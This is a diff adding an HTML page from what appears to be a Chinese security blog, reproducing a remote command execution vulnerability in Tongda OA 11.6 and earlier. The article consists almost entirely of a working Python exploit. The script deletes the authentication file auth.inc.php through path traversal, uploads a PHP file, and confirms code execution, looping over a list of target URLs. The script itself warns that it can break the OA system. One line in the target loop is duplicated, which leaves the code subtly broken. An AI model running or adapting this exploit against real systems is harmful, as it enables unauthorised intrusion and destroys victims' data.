@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="通达oa 11.6 远程命令执行漏洞一、漏洞简介此漏洞会导致网站程序严重损坏，并影响网站业务正常运行，请谨慎使用！ 二、漏洞影响通达oa &lt;&#x3D; 11.6 三、复现过程poc#! &#x2F;usr&#x2F;bin&#x2F;env python3 # -*- coding: utf-8 -*- import requests #by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用 im">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%2011.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="通达oa 11.6 远程命令执行漏洞一、漏洞简介此漏洞会导致网站程序严重损坏，并影响网站业务正常运行，请谨慎使用！ 二、漏洞影响通达oa &lt;&#x3D; 11.6 三、复现过程poc#! &#x2F;usr&#x2F;bin&#x2F;env python3 # -*- coding: utf-8 -*- import requests #by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用 im">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:11.070Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-通达oa/通达oa 11.6 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%2011.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.070Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-11-6-远程命令执行漏洞"><a href="#通达oa-11-6-远程命令执行漏洞" class="headerlink" title="通达oa 11.6 远程命令执行漏洞"></a>通达oa 11.6 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>此漏洞会导致网站程序严重损坏，并影响网站业务正常运行，请谨慎使用！</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>通达oa &lt;= 11.6</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>#! /usr/bin/env python3
+# -*- coding: utf-8 -*-
+import requests
+#by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用
+import sys
+version = sys.version_info
+if version &lt; (3, 0):
+    print(&#39;The current version is not supported, you need to use python3&#39;)
+    sys.exit()
+    
+def exploit(target):
+    try:
+        target=target
+        payload=&#39;&lt;?php echo md5(&quot;exp-test&quot;); ?&gt;&#39;#无害检测
+        print(target,&quot;[*]删除auth.inc.php...&quot;)
+
+        url=target+&quot;/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php&quot;#删除auth.inc.php请求
+        requests.get(url=url,verify=False,timeout=10)
+        print(target,&quot;[*]正在检查文件是否已删除...&quot;)
+        url=target+&quot;/inc/auth.inc.php&quot;
+        page=requests.get(url=url,verify=False,timeout=10).text
+        #print(page)
+        if &#39;No input file specified.&#39; not in page:
+            print(target,&quot;[-]无法删除auth.inc.php文件&quot;)
+            return 0
+        print(target,&quot;[+]删除auth.inc.php成功&quot;)
+        print(target,&quot;[*]开始上传payload...&quot;)
+        url=target+&quot;/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./&quot;
+        files = &#123;&#39;FILE1&#39;: (&#39;deconf.php&#39;, payload)&#125;
+        requests.post(url=url,files=files,verify=False,timeout=10)
+        url=target+&quot;/_deconf.php&quot;
+        page=requests.get(url=url,verify=False,timeout=10).text
+        if &#39;No input file specified.&#39; not in page:
+            print(&quot;[+]************************文件已存在，上传成功************************&quot;)
+            if &#39;8a8127bc83b94ad01414a7a3ea4b8&#39; in page:#如果执行过md5函数，才确认漏洞存在，减少误报
+                print(target,&quot;************************代码执行成功，存在漏洞************************&quot;)
+                print(target,&quot;[+]URL:&quot;,url)
+        else:
+            print(target,&quot;[-]文件上传失败&quot;)
+    except Exception as e:
+        print(target,e)
+urls=&#39;url.txt&#39;
+print(&quot;[*]警告：利用此漏洞，会删除auth.inc.php，这可能会损坏OA系统&quot;)
+input(&quot;按Enter继续&quot;)
+for url in open(urls,&#39;r&#39;,encoding=&#39;utf-8&#39;).read().split(&#39;\n&#39;):
+    url=url.split()
+    url=url.split()
+    exploit(url[0])
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%2011.6%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1cn00qsy8v17ewx3dvr" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%2011.7%20%E5%90%8E%E5%8F%B0getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%2011.5%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
